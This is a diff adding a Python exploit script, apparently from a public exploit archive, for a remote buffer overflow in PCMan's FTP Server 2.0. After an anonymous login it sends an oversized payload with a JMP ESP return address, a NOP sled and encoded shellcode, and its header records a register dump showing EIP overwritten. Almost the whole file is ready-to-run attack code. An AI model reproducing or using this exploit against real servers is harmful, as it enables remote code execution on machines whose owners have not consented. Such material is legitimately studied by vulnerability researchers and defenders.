@@ -1,0 +1,77 @@
+#!/usr/bin/python
+#
+#
+####################################################################
+#
+# Exploit Title: PCMan's FTP Server 2.0 Remote Buffer Overflow Exploit
+# Date: 2013/6/26
+# Exploit Author: Chako
+# Vendor Homepage: http://pcman.openfoundry.org/
+# Software Download Link: https://files.secureserver.net/1sMltFOsytirTG
+# Version: 2.0
+# Tested on: Windows 7 SP1 English
+#
+# EAX 00000000
+# ECX 00830A70
+# EDX 00000030
+# EBX 00000000
+# ESP 0018ED70 ASCII "AAAAAAAAAAAAAAAAAAAAA
+# EBP 01F214A0
+# ESI 0018ED87 ASCII "AAAAAAAAAAAAAAAAAAAAA
+# EDI 00000004
+# EIP 41414141
+#
+####################################################################
+
+import socket
+import sys
+
+USER    = "anonymous"
+PASSWD  = "TEST"
+
+PAYLOAD = "\x41" * 2010
+EIP     = "\xDB\xFC\x1C\x75"  # 751CFCDB   JMP ESP USER32.DLL
+NOP     = "\x90" * 10
+
+SHELLCODE =(
+   "\xba\x38\xdc\x15\x77\xdd\xc7\xd9\x74\x24\xf4\x5d\x33\xc9"
+   "\xb1\x33\x83\xc5\x04\x31\x55\x0e\x03\x6d\xd2\xf7\x82\x71"
+   "\x02\x7e\x6c\x89\xd3\xe1\xe4\x6c\xe2\x33\x92\xe5\x57\x84"
+   "\xd0\xab\x5b\x6f\xb4\x5f\xef\x1d\x11\x50\x58\xab\x47\x5f"
+   "\x59\x1d\x48\x33\x99\x3f\x34\x49\xce\x9f\x05\x82\x03\xe1"
+   "\x42\xfe\xec\xb3\x1b\x75\x5e\x24\x2f\xcb\x63\x45\xff\x40"
+   "\xdb\x3d\x7a\x96\xa8\xf7\x85\xc6\x01\x83\xce\xfe\x2a\xcb"
+   "\xee\xff\xff\x0f\xd2\xb6\x74\xfb\xa0\x49\x5d\x35\x48\x78"
+   "\xa1\x9a\x77\xb5\x2c\xe2\xb0\x71\xcf\x91\xca\x82\x72\xa2"
+   "\x08\xf9\xa8\x27\x8d\x59\x3a\x9f\x75\x58\xef\x46\xfd\x56"
+   "\x44\x0c\x59\x7a\x5b\xc1\xd1\x86\xd0\xe4\x35\x0f\xa2\xc2"
+   "\x91\x54\x70\x6a\x83\x30\xd7\x93\xd3\x9c\x88\x31\x9f\x0e"
+   "\xdc\x40\xc2\x44\x23\xc0\x78\x21\x23\xda\x82\x01\x4c\xeb"
+   "\x09\xce\x0b\xf4\xdb\xab\xe4\xbe\x46\x9d\x6c\x67\x13\x9c"
+   "\xf0\x98\xc9\xe2\x0c\x1b\xf8\x9a\xea\x03\x89\x9f\xb7\x83"
+   "\x61\xed\xa8\x61\x86\x42\xc8\xa3\xe5\x05\x5a\x2f\xc4\xa0"
+   "\xda\xca\x18");
+
+print("\n\n[+] PCMan's FTP Server 2.0 Rrmote Buffer Overflow Exploit")
+print("[+] Version: V2.0")
+print("[+] Chako\n\n\n")
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("127.0.0.1",21))
+data = s.recv(1024)
+
+
+print("[-] Login to FTP Server...\n")
+s.send("USER " + USER + '\r\n')
+data = s.recv(1024)
+
+s.send("PASS " + PASSWD + '\r\n')
+data = s.recv(1024)
+
+
+
+print("[-] Sending exploit...\n")
+s.send(PAYLOAD + EIP + NOP +SHELLCODE +'\r\n')
+s.close()
+
+print("[!] Done! Exploit successfully sent\n")
